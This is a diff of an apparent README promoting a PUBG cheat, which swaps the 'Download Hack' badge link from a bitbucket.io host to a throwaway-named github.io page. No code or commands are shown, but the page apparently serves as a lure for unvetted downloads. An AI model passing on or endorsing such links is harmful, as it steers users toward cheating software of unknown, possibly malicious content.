@@ -6,7 +6,7 @@ If you're tired of landing, looting, and dying within 2 minutes in PUBG, it's ti
 
 Let’s break it all down so you know exactly what you're getting.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload15.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://PUBG-Hack-Mod-joxu.github.io/.github)
 ---
 
 ## 🔥 Product Description
